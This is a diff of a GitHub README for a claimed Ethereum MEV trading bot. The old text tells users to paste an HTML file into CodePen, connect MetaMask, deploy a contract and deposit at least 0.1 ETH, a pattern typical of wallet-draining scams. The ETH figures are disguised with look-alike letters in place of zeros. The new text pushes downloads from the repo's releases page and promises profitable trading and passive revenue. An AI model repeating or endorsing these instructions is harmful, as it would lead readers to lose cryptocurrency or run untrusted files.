@@ -1,142 +1,76 @@
-
-# My Local Trading Bot 🤖
-
-  
-
-  
-
-![1](https://i.postimg.cc/B6c2txbp/Chat-GPT-Image-30-2025-18-19-40.png)
-
-  
-
-  
-
-Hey crypto enthusiasts! I’m excited to share my **Local Trading Bot** — a simple tool for real trading on the **Ethereum Mainnet**. Everything is packed in **one HTML file**, so you can run it directly on **CodePen** with zero hassle! 😎 The interface is inspired by VS Code — clean and intuitive — perfect for trading straight from your browser. Here’s how it works!
-
-  
-
-## Features
-
-  
-
-  
-
--  **All-in-One File**: The entire code is in one HTML file — just copy, paste it into CodePen, and you’re ready to go!
-
-  
-
--  **Wallet Connection**: Easily connect your MetaMask wallet to work with the smart contract.
-
-  
-
--  **Smart Contract Deployment**: Deploy your custom contract on Mainnet (you cover the gas fee).
-
-  
-
--  **Slippage Control**: Adjust slippage tolerance between **0.5% and 49%** for flexible trades.
-
-  
-
--  **MEV Protection & Sniping**: Enable protection from Miner Extractable Value (MEV) attacks or automatic deal sniping.
-
-  
-
--  **Workflow Control**:
-
-  
-
--  **Start**: Launches the trading process (requires ≥O.1 ETH, confirm function call).
-
-  
-
--  **Stop**: Stops the trading, available only after Start.
-
-  
-
--  **Withdraw**: Withdraws funds, available only after Stop.
-
-  
-
--  **Real-Time Terminal**: Displays current transactions, trade paths, and profit.
-
-  
-
--  **Responsive Design**: Works perfectly on both desktop and mobile devices.
-
-  
-
-## How to Run on [CodePen](https://codepen.io/pen/)
-
-  
-
-  
-
-1.  *Set up **MetaMask:***
-
-  
-
--  *Install **MetaMask** in your browser.*
-
-  
-
--  *Switch to the **Ethereum Mainnet**.*
-
-  
-
--  *Make sure your wallet has **≥О.1-1 ETH** plus gas for contract deployment.*
-
-  
-
--  *Open the editor at **[CodePen](https://codepen.io/pen)**.*
-
-  
-
--  *Paste*  **(source.html)** code into the **HTML** block.*
-
-  
-
-2.  **Start Trading:**
-
-  
-
--  *Click **Connect MetaMask** to link your wallet.*
-
-  
-
-![Connect MetaMask](https://i.postimg.cc/4N3pNHgv/code.png)
-
-  
-
--  *Click **Deploy Contract** to deploy your smart contract (gas required).*
-
-  
-
--  *Enter **≥0.1-1 ETH**, set your slippage **(0.5%–49%)**, and click **Start**, confirming the function call in **MetaMask**.*
-
-  
-
--  *Check the log window for current transactions and profit potential.*
-
-  
-
-![1](https://i.ibb.co/N6RB81pH/34.png)
-
-  
-
--  *Click **Stop** to halt the simulation, then **Withdraw** to retrieve your funds.*
-
-  
-
-3.  *Monitor the Terminal: The logs show transactions and profit in real time, plus profitable opportunities based on a **1 ETH deposit**.*
-
-  
-
-  
-
----
-
-  
-
-  
-
-**Happy Trading! 🚀**
+# 🚀 Trading-Bot_Mev_Local_PC - Trade Smarter with Automated Strategies
+
+## 📥 Download the Latest Version
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20https%3A%2F%2Fgithub.com%2Falennani%2FTrading-Bot_Mev_Local_PC%2Freleases-blue)](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases)
+
+## 📖 Overview
+Welcome to the **Trading-Bot_Mev_Local_PC**! This trading bot is designed for decentralized finance (DeFi) and runs directly in CodePen using JavaScript. It supports trading on decentralized exchanges (DEXs) like Uniswap and SushiSwap. With built-in technical indicators such as RSI and MACD, this bot can help you create custom trading strategies and use cross-chain bridges effectively.
+
+## ⚙️ Features
+- **Real Trading**: Seamlessly trade on platforms like Uniswap and SushiSwap.
+- **Technical Indicators**: Utilize tools like RSI and MACD to enhance your trading strategies.
+- **Custom Strategies**: Build and implement your own trading methods tailored to your needs.
+- **Cross-Chain Bridges**: Access multiple blockchains for a more diversified trading experience.
+- **User-Friendly Interface**: Designed for non-technical users, making it easy to start trading.
+
+## 🛠️ System Requirements
+To run the Trading-Bot_Mev_Local_PC, ensure your system meets the following requirements:
+- **Operating System**: Windows, macOS, or Linux.
+- **Browser**: Updated versions of Chrome, Firefox, or Safari.
+- **JavaScript Enabled**: Make sure JavaScript is enabled in your browser settings.
+- **Internet Connection**: A stable internet connection is required for real-time trading.
+
+## 🚀 Getting Started
+Follow these steps to download and set up your trading bot:
+
+1. **Visit the Download Page**: Go to the [Releases Page](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases) to find the latest version.
+   
+2. **Download the Software**: 
+   - Click on the latest release available.
+   - Download the files necessary for running the bot.
+
+3. **Prepare Your Environment**:
+   - Open CodePen in your web browser.
+   - Create a new Pen to upload your trading bot files.
+
+4. **Upload Bot Files**:
+   - Use the CodePen interface to upload your downloaded files.
+   - Ensure all files are correctly referenced in your Pen settings.
+
+5. **Configure Settings**:
+   - Input your trading preferences and setup parameters like API keys.
+   - Customize indicators and strategies as needed.
+
+6. **Start Trading**:
+   - Click the "Run" button on CodePen to start the bot.
+   - Monitor its performance and tweak strategies as necessary for optimal results.
+
+## 📦 Download & Install
+To get started, [visit this page to download](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases) the latest version of Trading-Bot_Mev_Local_PC. Follow the instructions outlined above to set it up.
+
+## 💡 Helpful Tips
+- **Testing**: Before trading with real money, test your strategies using a practice account.
+- **Stay Updated**: Check back regularly on the releases page for updates to the bot.
+- **Documentation**: Review any available documentation for guidance on advanced features and troubleshooting.
+
+## 🤝 Community Support
+Engage with other users and get support through discussions on the repository. Share your experiences, ask questions, or look for tips on improving your trading strategies. 
+
+## 🌐 Topics
+This project covers areas such as:
+- Arbitrage
+- Bots
+- Ethereum
+- HTML and JS
+- Local setups
+- Passive revenue generation
+
+Feel free to explore them as you navigate your trading journey. 
+
+## ⚠️ Disclaimer
+Trading cryptocurrencies involves risk. Be sure to do your own research and only invest what you can afford to lose.
+
+## 🧑‍💻 Contributing
+Contributions are welcome! If you have suggestions or improvements, please open issues or pull requests on this repository.
+
+For more information and to stay updated, remember to check out the [Releases Page](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases) regularly. Happy trading!
